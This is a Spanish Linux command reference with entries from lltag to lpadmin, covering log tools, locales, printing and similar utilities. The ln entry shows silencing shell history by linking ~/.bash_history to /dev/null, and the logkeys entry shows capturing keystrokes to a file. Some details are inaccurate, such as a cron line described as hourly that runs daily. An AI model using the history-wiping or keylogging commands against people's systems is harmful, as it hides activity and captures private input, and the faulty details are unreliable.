Herramienta que manipula etiquetas [tags] en archivos MP3 ID3, OGG o FLAC. Permite etiquetar varios archivos a la vez comparando su nombre o ruta de acceso con una lista configurable de formatos, o bien obteniendo las etiquetas de la base de datos CDDB. También puede renombrar archivos según un formato configurable.
$ lltag -S *.mp3 (muestra las etiquetas ID3 de todos los archivos MP3 en el directorio actual)
$ lltag --show-tags artist,title *.flac (muestra solo las etiquetas específicas "artist" y "title" en los archivos FLAC)
$ lltag --artist "Queen" --album "Innuendo" --genre "Rock" *.mp3 (establece los valores de ARTIST, ALBUM y GENRE para todos los MP3 en la carpeta)
$ lltag --tag foo=nil foo.ogg (escribe un tag personalizado "foo" con valor "nil" en un archivo OGG)
$ lltag --tag foo= archivo.ogg (elimina la etiqueta personalizada "foo"` de un archivo OGG)
$ lltag --no-tagging --rename "%n - %a - %t" song.flac (renombra el archivo según el patrón Número - Artista - Título, sin modificar las etiquetas)
$ lltag --clear *.flac (elimina todas las etiquetas de todos los archivos FLAC del directorio)
$ lltag -F "%n - %a - %t" *.mp3 (extrae los campos Número, Artista y Título del nombre de los archivos y actualiza las etiquetas)
$ lltag --no-tagging --rename "%a - %t" *.mp3 (renombra archivos MP3 a "Artista - Título.mp3" sin cambiar los metadatos)
$ lltag --artist "The Beatles" song.mp3 (modifica la etiqueta de artista en un archivo concreto)


lltdscan
Buscar hosts en una red local que tienen el protocolo LLTD [Link Layer Topology Discovery] habilitado. Este protocolo es utilizado principalmente para descubrir la topología de la red a nivel de capa de enlace, lo que puede ser útil para herramientas de diagnóstico y mapeo de red.
$ lltdscan (escaneará la red local en busca de hosts con LLTD habilitado utilizando la interfaz de red predeterminada)
$ lltdscan -i eth0 (escaneará la red local utilizando la interfaz especificada)
$ lltdscan -t 5 (escaneará la red local con un tiempo de espera de 5 segundos para las respuestas)
        Host 1: 192.168.1.1 - LLTD enabled
        Host 2: 192.168.1.2 - LLTD enabled
        Host 3: 192.168.1.3 - LLTD not enabled
En este ejemplo, los hosts con las direcciones IP 192.168.1.1 y 192.168.1.2 tienen el protocolo LLTD habilitado, mientras que el host con la dirección IP 192.168.1.3 no.


lltsv
Herramienta diseñada para procesar y visualizar archivos o texto en formato LTSV [Labeled Tab Separated Values] con salida coloreada en una terminal. Su principal función es mostrar únicamente las claves o campos específicos que el usuario desee, resaltando los resultados con colores cuando se trabaja en una terminal interactiva. Este formato es muy común en registros de aplicaciones y servidores web, donde cada dato tiene una etiqueta [clave] y un valor, separados por dos puntos, y cada campo está separado por tabulaciones.
$ echo -e "host:127.0.0.1\tuser:frank\tstatus:200" | lltsv -k host,status (extraer las claves "host" y "status" y los valores aparecerán resaltados)
$ echo -e "foo:aaa\tbar:bbb\tbaz:ccc" | lltsv -k foo,bar -K (mostrar sólo los valores sin etiquetas)
$ lltsv -k host,req,status -f "status == 404" access_ltsv.log (mostrará líneas donde el campo "status" tenga el valor 404)
$ lltsv -k user,status log*.ltsv (listar los campos "user" y "status" de todos los archivos que empiezan por "log")
Operadores admitidos en filtros
        ==, != --> comparación de cadenas
        >, =, <= --> comparación numérica
        =~, !~ --> expresiones regulares


lm4flash
Herramienta de actualización de firmware mediante línea de comandos que utiliza libusb-1.0 para comunicarse con Stellaris Launchpad ICDI [In-Circuit Debug Interface]. Stellaris Launchpad es una placa de desarrollo de bajo coste creada por Texas Instruments que incluye un procesador ARM Cortex-M4F. En esencia, lm4flash toma un archivo de firmware, generalmente en formato .bin o .hex y lo "flashea" [lo escribe] en la memoria flash del microcontrolador de la Launchpad a través de la conexión USB.
$ lm4flash mi_firmware.bin (cargar en Launchpad el archivo de firmware especificado)
$ lm4flash mi_firmware.hex (lo mismo con un archivo .hex)
$ lm4flash -e (borrar la memoria flash del dispositivo)


lmbench
Herramienta para probar el rendimiento de un sistema. La primera vez que se ejecute hará varias preguntas [las opciones por defecto son suficientes] y algunos chequeos. Su ejecución lleva bastante tiempo.
# lmbench-run


lmdb-utils
[lmdb-go-tools]. Utilidades para manipular Bases de datos de LMDB [Lighting Memory-Mapped Database]. Incluye las herramientas mdb_copy, mdb_stat, lmdb_cat, lmdb_copy, lmdb_stat y testresize
$ mdb_copy original.lmdb copia.lmdb (copia una base de datos LMDB a otra ubicación)
$ mdb_stat -a mi_basedatos.lmdb (muestra estadísticas de la base de datos LMDB, como el número de entradas y el tamaño)
$ lmdb_cat mi_basedatos.lmdb (lista el contenido de una base de datos)
$ testresize mi_basedatos.lmdb 1048576 (probar el redimensionamiento de una base de datos LMDB [a 1 MB])
$ mdb_stat -e datos.lmdb (diagnosticar problemas de rendimiento)


lmod
Es un sistema de módulos basado en Lua que gestiona fácilmente el problema jerárquico de MODULEPATH, especialmente en entornos de cómputo de alto rendimiento [HPC] . Esto incluye la fácil adición o eliminación de directorios a la variable de entorno PATH. Un módulo es un archivo que define cómo configurar el entorno para un software específico. por ejemplo, agregar rutas al PATH o definir variables de entorno. El paquete lmod no instala directamente el comando module, para cargarlo:
$ source /usr/share/lmod/lmod/init/bash (carga el entorno de Lmod)
Para activarlo de forma permanente, añadir a .bashrc la linea:
        source /usr/share/lmod/lmod/init/bash
$ module list (muestra los módulos actualmente cargados)
$ module avail (lista los módulos disponibles para cargar)
$ module load gcc/9.3.0 (carga un módulo específico)
$ module unload gcc/9.3.0 (descarga un módulo, eliminando sus configuraciones del entorno)
$ module purge (limpia el entorno, dejando solo las configuraciones predeterminadas del sistema)
$ module show python/3.8.5 (muestra la configuración que realiza un módulo)
$ module swap gcc/9.3.0 gcc/10.2.0 (reemplaza GCC 9.3.0 por GCC 10.2.0 en el entorno)
$ module spider openmpi ((busca un módulo especifico [openmpi])
Nota.- ver el paquete environment-modules que al instalarlo, desinstala lmod.


ln
Crear enlaces de archivos o carpetas.
$ ln -s /home/ct/videos /home/Desktop/videos (Crea un enlace a videos en Desktop)
$ ln -f (Borra los ficheros de destino si ya existen)
$ ln -i (Pregunta antes de borrar ficheros de destino existentes)
$ ln -s /dev/null ~/.bash_history  (vincular historial a /dev/null)
$ ln -sf /opt/metasploit/msf* /usr/bin (Crear un enlace a /usr/bin de todos los ejecutables que empizan por msf del directorio /opt/metasploit)
$ ln /Documentos/emacs /emacs/ (crea un enlace duro. Si se borra el fichero original la información no se pierde. Si se borra uno, el otro permanece operativo)


lnav
Visor avanzado de archivos de registro normalmente situados en /var/log/.
# lnav /var/log/ (sobre todos los logs del sistema)
# lnav /var/log/syslog (sobre un log concreto)
# lnav -r /var/log/auth.log (incluir archivos comprimidos en la salida)
# lnav /var/log/auth.log -d auth.txt (mandar la información de depuración a un archivo)
Algunas teclas de control:
    e (saltar al mensaje de error siguiente)
    w (saltar al mensaje de advertencia siguiente)
    b (página anterior)
    Espacio (página siguiente)
    g (moverse a la parte superior/inferior de la página)
    p (detalle del log del cursor)
    G (salir)


lnstat
Proporciona estadísticas de redes. Es un sustituto del antiguo programa rtstat.
# lnstat -c 3 (realiza 3 muestras)
# lnstat -d (Lista de opciones)
# lnstat -k entries (Muestra solo esta opción)
# lbstat -i 2 (2 segundos entre muestra y muestra)


lo
Abrir documentos o herramientas de libreoffice
$ lowriter -o archivo.odt
$ lowriter --convert-to pdf:writer_pdf_Export --outdir /home/USER/dir dotemacs (Pasar el archivo dotemacs a pdf y colocarlo en el directorio "dir")
$ loffice --headless --convert-to odt:"writer8" archivo.docx (Convertir un docx a odt)
$ loffice --infilter="writer_pdf_import" --convert-to doc archivo.pdf (pasar un pdf a doc)
$ localc --headless --convert-to txt:"Text - txt - csv (StarCalc)" archivo.xlsx (Convertir un xls a txt)
$ localc --convert-to pdf archivo.ods (convertir a pdf un ods)
$ localc -o archivo.ods
$ lomath -o archivo.odf
$ lodraw -o archivo.odg
$ loimpress -o archivo.odp
$ loweb -o archivo.html


loadkeys
Modificar la distribución del teclado. Afecta a las tty. Para las X el comando es setxkbmap.
# loadkeys es
# loadkeys /usr/share/kbd/keymaps/i386/qwerty/es.map.gz
Nota.- Para encontrar la ruta al mapa de teclado:
# find / -iname es.map*


loadwatch
Permite ejecutar un programa únicamente cuando la carga media del sistema [load average] está por debajo de ciertos límites definidos por el usuario. Si la carga del sistema sube por encima de un umbral "alto" determinado, el proceso se pausa; cuando la carga baja por debajo de un umbral "bajo", el proceso se reanuda automáticamente.
$ loadwatch 2.0 1.5 10 tar czf backup.tar.gz /home/USER/ (realizar el backup. Si el valor de la carga sube de 2.0 el proceso se pausa, se reanuda cuando baja de 1.5 y se comprueba cda 10 segundos)
$ loadwatch 1.0 0.7 5 ./procesar_datos.sh (el script se ejecuta solo si la carga está por debajo de 1.0, se pausa si alcanza ese valor, y se reanuda al bajar de 0.7, comprobando cada 5 segundos)
$ lx-ctl procesar_datos.sh stop (parar manualmente el proceso gestionado por loadwatch. "run" activa el modo de ejecución y "watch" activa el modo de supervisión de carga normal)


local
BASH nos permite utilizar dos tipos de variables, las locales y globales. Básicamente, la diferencia entre ambas es que la variable local tiene valor únicamente dentro de nuestra shell, es decir en de nuestra sesión. Por el contrario, las variables globales se establecen para todas las shells.
$ VAR1="Linux es un sistema genial" (crear una variable local)
$ echo $VAR1 (lanzarla)
$ unset VAR1 (anularla o reiniciando se anula)
$ export VAR2="Linux es un sistema genial" (crear varialbe global)
$ unset VAR2 (anularla. Reiniciando no se anula)


local-apt-repository
Repositorio local de apt listo para usar. Con este paquete instalado, todos los paquetes Debian [los archivos *.deb] que se coloquen en /srv/local-apt-repository [que debe crear primero] estarán disponibles para apt. Este paquete no proporciona un repositorio de apt para otros hosts.
# mkdir /srv/local-apt-repository (crear el directorio)
Todos los .deb que se coloquen en el directorio estarán disponibles localmente para apt.
# systemctl restart local-apt-repository.service (reiniciar servicio después de modificar los archivos del directorio)


locale
Información sobre los idiomas del sistema
$ locale -a  (muestra los idiomas disponibles)
$ locale -m (mapas de caracteres que tenemos en el sistema)
$ locale | grep LANG=  (muestra el idioma por defecto)
$ locale (Muestra los idiomas actualmente en uso)
En  algunas distros [Arch] es preciso crear el archivo:
# nano /etc/locale.conf
Y añadir el idioma escogido:
LANG="es_ES.UTF-8"
El idioma tiene que estar descomentado en /etc/locale.gen y luego generado por locale-gen


locale-gen
Reconfiguración automática de los locales
$ locale-gen


localectl
Controlar la configuración regional del sistema y la distribución del teclado
$ localectl status
$ localectl list-locales


localehelper
Herramienta de Debian que se utiliza principalmente para gestionar las configuraciones regionales o locales en sistemas operativos.
$ localehelper LANG=es_ES.UTF-8 locale day |  tr ';' '\n'


localepurge
Elimina e impide la instalacion de los paquetes de idiomas y páginas man que no hemos escogido.
# localepurge
En arch:
# nano /etc/locale.nopurge
Comentar la linea:
#NEEDSCONFIGFIRST
Y al final del fichero, suprimir o comentar los exsitentes y colocar los de nuestra elección, por ejemplo:
ca_ES.UTF-8
ca_ES.ISO-8859-1
ca_ES.ISO-8859-15@euro
es_ES.UTF-8
es_ES.ISO-8859-1
es_ES.ISO-8859-15@euro
Una vez realizados los ajustes, lanzar la aplicación.


locate
Buscar archivos
$ locate parida.txt
$ locate firefox/plugins


location
Consultar la base de datos de IPFire [base de datos de geolocalización de Internet] y determinar la ubicación en función de su dirección IP.
$ location update (recargar la base de datos)
$ location list-countries --show-continent --show-name (listado de todos los paises con su nombre y continente al que pertenecen)
$ location lookup 2.142.97.159 (localizar una IP)
$ location search-as "linux" (Buscar un sistema por nombre)


lockfile-progs
Proporciona una serie de utilidades de línea de comandos para gestionar bloqueos de archivos y buzones de correo de forma segura. Estos bloqueos son cruciales en entornos multiusuario o donde múltiples procesos podrían intentar acceder o modificar el mismo archivo simultáneamente, lo que podría llevar a corrupción de datos o inconsistencias. Incluye las herramientas lockfile-create, lockfile-remove, lockfile-touchlock, mail-lock, mail-unlock y mail-touchlock. La idea principal detrás de los "lockfiles" [archivos de bloqueo] es crear un archivo temporal con un nombre específico a menudo derivado del archivo que se quiere proteger, que indica que un proceso tiene el control exclusivo sobre ese recurso. Si otro proceso intenta acceder al recurso y ve el archivo de bloqueo, sabe que debe esperar o abortar.
$ lockfile-create -r 2 -l 3 -s 10 script (2 reintentos, 3 segundos entre reintentos y 10 segundos de espera para el bloqueo del acceso al script)
$ lockfile-remove ruta_al_archivo_de_bloqueo  (elimina un archivo de bloqueo existente. Se usa para liberar un bloqueo que ha sido adquirido)
$ lockfile-touchlock <ruta_al_archivo_de_bloqueo> (actualiza la marca de tiempo de un archivo de bloqueo existente)


lockout
Herramienta que impone disciplina para que pueda realizar algún trabajo. Por ejemplo, el bloqueo se puede utilizar para instalar un firewall que no le permita navegar por la Web. El bloqueo cambia la contraseña de root durante un período específico; esto le impide eliminar secretamente el firewall y luego navegar por la Web de todos modos. En caso de emergencia, puede reiniciar su computadora para deshacer los efectos del bloqueo y restaurar la contraseña de root original.
$ lockout (muestras varios advertimientos sobre la aplicación:)
   !! ADVERTENCIA !!
      Este programa es MUY PELIGROSO.
$ lockout lock 2h30m (cerrar en 2 horas 30 minutos)
$ lockout status (mirar el estado de la aplicación)


logapp
Utilidad que se utiliza para supervisar y registrar la salida de aplicaciones de consola que generan una gran cantidad de datos, como make, CVS y Subversio. Su principal función es registrar, recortar y colorear cada línea de salida antes de mostrarla, lo que facilita la supervisión y el análisis de la salida de estas aplicaciones.
$ logapp make (supervisar la salida de make y registrarla en un archivo además de mostrarla en consola)
$ logapp cvs update (registrará toda la salida en un archivo de registro)
$ logapp svn update (registrar la salida de subversion)
1.-
Un ejemplo con un archivo de configuración personalizado
$ nano logapp.conf
        color error red
        color warning yellow
        color info green
        trim 80
Que los mensajes de error se muestren en rojo, las advertencias en amarillo, la información en verde y que las líneas se recorten a 80 caracteres.
$ logapp -c logapp.cons make (lazar make con el archivo de configuración anterior)


logcheck
Herramienta que analiza periódicamente todos los logs del sistema. En la instalación ya se instala como una tarea en el cron en el fichero /etc/cron.d/logcheck.
Para recibir correos con los informes,Editar el fichero:
# nano /etc/logcheck/logcheck.conf
y descomentar o completar las líneas:
	DATE="$(date +'%d-%m-%Y %H:%M')"
	SENDMAILTO="tu@direccion.com"
	REPORTLEVEL="paranoid"
	MAILASATTACH=1


logdata-anomaly-miner
Esta herramienta permite analizar los flujos de datos de registro [logs] y detectar patrones anómalos o posibles violaciones de seguridad. Puede ejecutarse desde la consola, como un demonio con alertas por correo electrónico o integrarse como biblioteca en programas propios
$ logdata-anomaly-miner -f /var/log/auth.log (analiza un archivo de logs en busca de anomalías)
$ tail -f /var/log/apache2/access.log | logdata-anomaly-miner --stdin (redirigir logs desde otro comando)
Ejemplo de archivo de configuración para alertas por correo electrónico.
$ nano config.json
        {
          "smtp": {
            "server": "smtp.example.com",
            "port": 587,
            "username": "user@example.com",
            "password": "password123",
            "from": "alerts@example.com",
            "to": "admin@example.com"
          },
          "rules": [
            {
              "name": "Failed SSH login",
              "pattern": "Failed password for .* from",
              "severity": "high"
            }
          ]
        }
$ logdata-anomaly-miner --daemon --config config.json (inicia el demonio)


loggedfs
Sistema que puede registrar cada operación que ocurre dentro de un directorio y sus subdirectorios. loggedfs está basado en fuse y solo envía un mensaje a syslog cuando lo llama fuse.
$ loggedfs -f -p /home/user/Documentos (probar el comando sin instalar un archivo de configuración. Mostrar ruta absoluta al directorio)
$ loggedfs -c .config/loggedfs/loggedfs.xml -p /home/user/Documentos (especificando el archivo de configuración)
$ loggedfs -l /var/log/loggedfs.log -c .config/loggedfs/loggedfs.xml -p /home/user/Documentos (especificando archivos de logs)
$ fusermount -u /home/user/Documentos (terminar el registro)
Nota.- Descomentar la linea "user_allow_other" en el archivo /etc/fuse.conf


logger
Enviar mensajes al demonio syslogd
$ logger -i -t gnome-terminal -f /var/log/messages inicio terminal (escribirá en el registro el mesaje “inicio terminal” como remitido por “gnome-terminal” y guardando el PID)


login
Solicitar la contraseña de usuario.
$ login -f  usuario (Inicia nueva sesión dentro de la actual)


login-duo
Envoltorio de inicio de sesión para la autenticación de dos factores [2FA] de Duo Security. En lugar de simplemente aceptar el usuario/contraseña, este comando añade un segundo factor de autenticación usando los servicios de Duo Security, normalmente mediante notificaciones push, códigos temporales o llamadas telefónicas. Está diseñado principalmente para usarse junto con las configuraciones globales del servidor OpenSSH.
Configuración básica
# nano /etc/duo/login_duo.conf
        ikey = DIXXXXXXXXXXXXXXXXXX
        skey = 9bXXXXXXXXXXXXXXXXXXXXXXXXXX
        host = api-XXXXXXXX.duosecurity.com
        pushinfo = yes
# nano /etc/pam.d/sshd
        auth required pam_duo.so
$ login-duo (probarlo de forma local)


loginctl
Realizar una introspección y controlar el estado del administrador de inicio de sesión de systemd.
$ loginctl list-sessions
$ loginctl session-status 1
$ loginctl lock-sessions (pide contraseña y suspende pantalla)
$ loignctl -a (muestra las propiedades de sesión/usuario independientemente de si están configuradas o no)
$ loginctl list-users (lista los usuarios con sesión abierta)
$ loginctl -psessions (muestra todas las sesiones abiertas)
$ loginctl seat-status (muestra todos los procesos que están relacionados con el asiento)
Nota.- "Seat" permite conectar varios conjuntos de hardware (ratón, teclado, pantalla) y utilizarlo por varios usuarios al mismo tiempo. Por lo general, esta función no se utiliza y la utilidad muestra solo un "asiento".


logiops
Herramienta que permite configurar en detalle ratones y teclados Logitech. Archivo de configuración en /etc/logid.cfg
# logid --discover (ver los dispositivos conectados y sus nombres)
# logid (muestra si la configuración se ha aplicado correctamente)
# systemctl enable logid (habilitarlo para que arranque con el sistema)


logkeys
Registrar las pulsaciones que se realizan en el teclado. Descarga de <https://github.com/kernc/logkeys>
$ touch test.log (crear el fichero donde gaurdar las pulsaciones)
$ logkeys -s -m es.map -o test.log (arrancar la aplicación, con teclado español y guardar en el archivo creado)
$ logkeys -k (parar y consultar test.log)
Nota.- Los mapas de teclado para descargar estan en <https://github.com/kernc/logkeys/tree/master/keymaps>


logname
Devuelve el nombre del usuario actual


logout
Cerrar sesión de usuario. En las ttys, las cerrará para volver a entrar el login.
$ logout


logresolve
Resolver direcciones IP a nombres de host en archivos de registro de Apache. Para minimizar el impacto del servidor de nombres, logresolve tiene su propia caché interna de tablas de control. Esto significa que cada número IP sólo se buscará la primera vez que se encuentre en el archivo de registro.
# logresolve < /var/log/apache2/access.log > logresoslve.txt


logrotate
Rotación, compresión y correos del sistema de logs.
# logrotate -d /etc/logrotate.conf (Verificación del correcto funcionamiento)
# logrotate -f /etc/logrotate.conf  (forzar la verificación)
Ejemplo típico para rotar logs de fail2ban:
# nano /etc/logrotate.d/fail2ban
	/var/log/fail2ban.log {
	weekly		# rotado semanal
	rotate 4	# numero maximo de ficheros rotado
	compress	# comprimir cuando se rote
	notifempty      # no rotar el log si esta vacio
	missingok	# continuar sin error si el fichero no existe
	create 640 root adm	# permisos, propietario y grupo del fichero rotado
	postrotate	# tarea a realizar despues del rotado
		fail2ban-client flushlogs 1>/dev/null
	endscript
	}
1.-
Por defecto, se añade un numero al fichero rotado. Si queremos que se use la fecha:
# nano /etc/logrotate.conf
Añadir la linea:
dateext


logsave
Guardar la salida de una orden en un archivo de registro.
$ logsave -a file.log ifconfig (Añadiendo la salida al contenido existente)


logstalgia
Reproduce o transmite registros de acceso al servidor web como una simulación retro, generando una visualización en forma de puntos o personajes que representan a los visitantes, simulando su navegación en tiempo real o a partir de registros históricos.
# logstalgia /var/log/apache2/access.log (visualizar los registros en tiempo real desde un archivo de log)
# logstalgia /var/log/nginx/access.log (lo mismo con nginx)
# tail -f /var/log/apache2/access.log | logstalgia (registros en tiempo real)
# logstalgia --fullscreen /var/log/apache2/access.log (a pantalla completa)


logswan
Analizador de logs de servidores web como Apache, Nginx, etc. con estructuras de datos probabilísticas. Esto significa que, en lugar de almacenar y contar cada visita de forma exacta, utiliza algoritmos para estimar las métricas. Genera un único archivo HTML con todas las estadísticas [Número de visitas totales y únicas, navegadores y sistemas operativos más usados, páginas más visitadas, países de origen de las visitas, etc].
$ logswan /var/log/nginx/access.log (generará un archivo llamado report.html en el directorio actual con el análisis de los logs)
$ zcat -f /var/log/nginx/access.log* | logswan -o full_report.html (analizar archivos log sin comprimir y comprimidos [acces.log.1-gz, acces.log.2.gz...])
$ logswan /var/log/nginx/access.log --date-from 2023-12-25 --date-to 2023-12-25 (analizar solo los logs del 25 de diciembre de 2023)
$ logswan /var/log/nginx/access.log --geoip-database /path/to/GeoLite2-City.mmdb (ver el reporte de visitas por país)
Nota.- Para geolocalización de IP se precisa una base de datos de DeoIP en formato .mmdb. Puede descargarse de https://github.com/P3TERX/GeoLite.mmdb


logtail
Identificar nuevas líneas añadidas al final de los archivos de registro [logs]. Lee un archivo de log y recuerda la posición en la que se quedó la última vez que se ejecutó. La próxima vez que se ejecute, solo mostrará las líneas que se han añadido desde la última ejecución.
# logtail -f/var/log/apache2/access.log (monitorear las nuevas líneas que se añaden)
# logtail -o/var/log/syslog.offset -f/var/log/apache2/access.log (recordará la posición de la última lectura en el archivo .offset del .log)
# logtail -t /var/log/apache2/access.log (en modo test)


logtool
Analizador de archivos de registro y generador de informes de estilo syslog, capaz de producir ANSI, ASCII, CSV, HTML o simplemente resultados sin formato.
$ cat /var/log/messages | logtool -t -s -p short -o HTML > /home/pep/logs/messages.html (formato de la hora corto [HH:MM] y no mostrar el campo "fuente" ni el campo "programa")


logtools
Herramientas útiles para analizar, filtrar, dividir y combinar en diferentes formatos archivos de registro [logs]. Incluye las aplicaciones clfmerge, logprn, funnel, clfsplit y clfdomainsplit.
$ clfmerge access.log.1 access.log.2 > combined.log (combina múltiples archivos de registro en formato Common Log Format [CLF] ordenándolos cronológicamente)
$ logprn --from "2023-10-01" --to "2023-10-31" /var/log/apache2/access.log (imprime registros de logs permitiendo filtrar por fechas u otros criterios)
$ funnel /var/log/nginx/access.log /var/log/nginx/error.log > nginx_combined.log (redirige múltiples flujos de entrada a uno solo)
$ clfsplit --lines=1000 access.log split_access_ (divide access.log en archivos de 1000 líneas cada uno, con nombres como split_access_001, split_access_002, etc.)
$ clfdomainsplit access.log (crea archivos como com.example.log, org.example.log, etc, agrupando las peticiones por dominio)


logtop
Herramienta para analizar el archivo de registro de logs como entrada.
# tail -f /var/log/apache2/access.log | logtop


logwatch
Analiza los archivos de logs del sistema. El sistema está pensado para que toda la configuración sea especificada en /etc/logwatch y estas directivas sobreescriban a las que están en /usr/share/logwatch. Copiamos la configuación básica:
# cp /usr/share/logwatch/default.conf/logwatch.conf /etc/logwatch/conf
Los servicios y qué ficheros de log es capaz de procesar logwatch en /usr/share/logwatch/default.conf/logfiles y la configuración de logwatch para cada servicio en /usr/share/logwatch/default.conf/services.
Configuración básica sin envio por email:
# nano /etc/logwatch/conf/logwatch.conf
# indica el directorio donde tomara los logs
LogDir = /var/log
# Salida {mail|stdout|file}
Output = file
# formato de la salida {html|text}
Format = text
# Indicar que busque información en los archivos /var/log/message.1 o /var/log/messages.1.gz y no solo en /var/log/messages
Archives = Yes
# Dia a analizar {Yestedary|Today|all}
Range = All
# Detalles de los logs (0-10)|(Low,Mid,High)
Detail = 8
# Servicios monitorizados {service_name|all}
# Service = fail2ban (Especificando servicio o todos):
Service = All
Notas.- Es posible poner todos los servicios y descartar algunos con Service = --fail2ban. Si el archivo de logs no está en el fichero especificado editar el servicio concreto de /usr/share/logwatch/default.conf/services y modificarlo.
# mkdir /var/cache/logwatch (Crear el directorio, si no existe, donde se guardarán las carpetas con los informes)
Lanzar logwatch cada hora:
# crontab -e
Y colocar la linea:
0 1  * * *   root       /usr/sbin/logwatch


lolcat
Colorear texto.
$ bash | lolcat -a -s 250 (todos los comandos que se entren se verán coloreados hasta cerrar la terminal)
$ fortune | cowsay -f tux | lolcat -s 64
$ ls | lolcat -a


lomoco
[LOgitech MOuse COntrol]. Permite configurar opciones específicas del fabricante en ratones USB Logitech o ratones de doble personalidad conectados al puerto USB. Es útil para modelos como el MX500, MX510, MX1000, G5 o G7, que pueden arrancar con una resolución baja, por ejemplo, 400 CPI y necesitan ajustes para optimizar su rendimiento, o para deshabilitar funciones como SmartScroll/Cruise Control.
$ lomoco -s (muestra una lista de dispositivos Logitech conectados, con su bus USB y ID de producto)
$ lomoco -p c025 -i (consultar el estado de un ratón específico, en este caso un MX500 con ID c025)
$ lomoco -p c025 --800 (aumentar la resolución del ratón a 800 CPI)
$ lomoco -p c041 --2000 (onfigurar un ratón G5 a 2000 CPI)
$ lomoco -p c025 --no-sms (deshabilitar SmartScroll/Cruise Control para usar los botones adicionales como botones estándar)
$ lomoco -p c025 --sms (restaurar el comportamiento predeterminado [SmartScroll/Cruise Control])
$ lomoco -p c025 -1 (configurar un ratón inalámbrico al canal 1 para un ratón con soporte CSR)
$ lomoco -p c025 -c (desvincular un ratón de su receptor)


look
Muestra entradas del diccionario que comienzan por esa palabra [/usr/share/dict/words]
$ look palabra


lookatme
Herramienta de presentaciones extensible basada en terminal que representa documentos Markdown y admite temas, resaltado de sintaxis, recarga de fuentes en vivo y manual y puede incrustar archivos externos y terminales en vivo en diapositivas. Algunos ejemplos de la propia aplicación:
$ lookatme presentacion.md (ejecutar una presentación)
$ lookatme --theme dark presentacion.md (con el teme dark, otra opción es el tema light)
$ lookatme /usr/share/doc/lookatme/examples/file_loader_ext/example.md
# lookatme /usr/share/doc/lookatme/examples/terminal_ext/example.md
# lookatme /usr/share/doc/lookatme/examples/progressive.md


lookup
Utilidad interactiva para buscar archivos de texto rápidamente. Ofrece: Conversor de romaji [nuestro alfabeto] a kana [silabario japones], búsqueda difusa [Fuzzy Search], búsqueda con expresiones regulares, filtrado, modificaciones automáticas y modo de preferencia de palabras inteligente.
$ lookup -writeindex **/*.txt **/*.org (crear un indice de todos los .txt y los .org del presente directorio y subdirectorios)
$ lookup archivo.txt
        search [archivo.txt]> palabra_a_buscar
Mostrará todas las coincidencias. Ctrl-D para salir de la interfaz.


lorem
[libtext-lorem-perl]
Crear textos aleatorios a partir del famoso lorem ipsum.
$ lorem -p 4 (Generar 4 párrafos)
$ lorem -w 10 (Generar 10 palabras)
$ lorem -s 2 (Generar 2 sentencias)


losetup
Programa para mostrar información sobre los dispositivos /dev/loop. Útil para saber donde se montan ciertos ficheros .img
$ losetup (muestra dispositivos /dev/loop y el fichero asociado)
# losetup -a (muestra toda la información de los dispositivos /dev/loop)
# losetup --find --show fichero.img (Encuentra y muestra a que dispositivo está asociado un fichero img)


lost+found
Carpeta donde el sistema almacena archivos marcados como dañados después de una comprobación de disco realizada con el comando fsck.


low-memory-monitor
Es un demonio diseñado para monitorear la presión de memoria en sistemas Linux y tomar acciones cuando la memoria disponible es crítica. Funciona en etapas tempranas del arranque del sistema y se integra con el kernel para gestionar situaciones de escasez de memoria. Primero, envía una señal a las aplicaciones de espacio de usuario cuando la memoria se está agotando y, luego, opcionalmente, activa el eliminador de memoria OOM [Out-Of-Memory Killer] del kernel cuando la memoria está en las últimas para evitar un colapso del sistema.
# systemctl status low-memory-monitor (verificar si está activo)
Ejemplo mínimo de configuración
# nano /etc/low-memory-monitor.conf
        # Umbral bajo (en %): notifica a las aplicaciones
        low_threshold=10
        # Umbral crítico (en %): activa OOM Killer
        critical_threshold=5
        # Tiempo de espera antes de actuar (en segundos)
        timeout=30
# systemctl enable low-memory-monitor (habilitar el servicio al inicio del sistema)
# journalctl -u low-memory-monitor -f (ver logs del demonio)


lowdown
es un traductor de Markdown que permite convertir archivos escritos en este lenguaje a varios formatos de salida, incluidos HTML5, roff para generar páginas de manual en los formatos ms y man, LaTeX, Gemini, y salida para terminal ANSI/UTF-8.
$ lowdown -t html -o archivo.html archivo.md (convertir Markdown a HTML5)
$ lowdown -t man  -o archivo.1 archivo.md (convertir Markdown a página de manual)
$ lowdown -t term archivo.md (presenta el Markdown con formato legible directamente en la terminal)
$ lowdown -t ms -o archivo.ms archivo.md (convertir Markdown al formato roff ms, útil para crear PDFs con groff)
Luego se podría generar el PDF usando groff:
$ groff -ms archivo.ms | ps2pdf - archivo.pdf


lp
Gestión de impresoras y trabajos de impresión. Aunque los comandos lp y lpr son distintos pero relacionados se han tratado en el mismo espacio.
$ lp fichero (imprime fichero con la impresora predeterminada)
$ lpr fichero (Imprimir un fichero)
$ lpr -P Otra_impresora fichero (Especificando una impresora)
$ lp -d otra_impresora fichero (Imprime con una impresora especificada)
$ lpq           (muestra los trabajos pendientes y les asigna un número)
$ lprm 5      (borra el trabajo pendiente de impresión especificado [5])
$ lprm -P HP_psc_1100_series - (Borrar todos los trabajos pendientes de la impresora especificada)
$ lprm - (Borra todos los trabajos pendientes de la predeterminada)
$ lpstat -p -d (muestra la impresora predeterminada)
$ lpstat -a           (muestra todas las impresoras)
$ lpstat -v           (indicando ubicación)
$ lp -n 10 fichero   (imprimirá 10 copias [opciones de 1 a 100])
$ lp -P 7,9,12-15 fichero (imprime las páginas indicadas y de la 12 a la 15)
$ lp -o media=A4 fichero (especificando tipo de papel o sobre)
Opciones “media”:
Letter – US Letter (216x279mm).
Legal – US Legal (216x356mm).
A4 – ISO A4 (210x297mm).
COM10 – US 10 Envelope (241x105mm).
DL – ISO DL Envelope (220x110mm).
$ lp -o media=Custom.ANCHOxLARGOmm fichero (con un papel de medida indicada)
$ lp -o landscape fichero (rotar 90º la impresión. Imprimir apaisado)
$ lp -o orientation-requested=4 fichero (lo mismo que el anterior)
1.-
Cuando al intentar imprimir sale el mensaje: Error - Scheduler Not Responding:
$ nano .bashrc
Y añadir la linea:
export CUPS_SERVER=localhost
2.-
Archivo de configuracion:
$ nano /etc/printcap
	lp|Generic dot-matrix printer entry:\
        	:lp=/dev/lp0:\
        	:sd=/var/spool/lpd/lp:\
	        :af=/var/log/lp-acct:\
	        :lf=/var/log/lp-errs:\
	        :pl#66:\
	        :pw#80:\
	        :pc#150:\
	        :mx#0:\
	        :sh:


lpadmin
Añadir impresoras [ver lp y lpoptions].
# lpadmin -p nombre_local -v usb://dispositivo -m driver (nombre de la impresora, URI de dispositivo y driver)
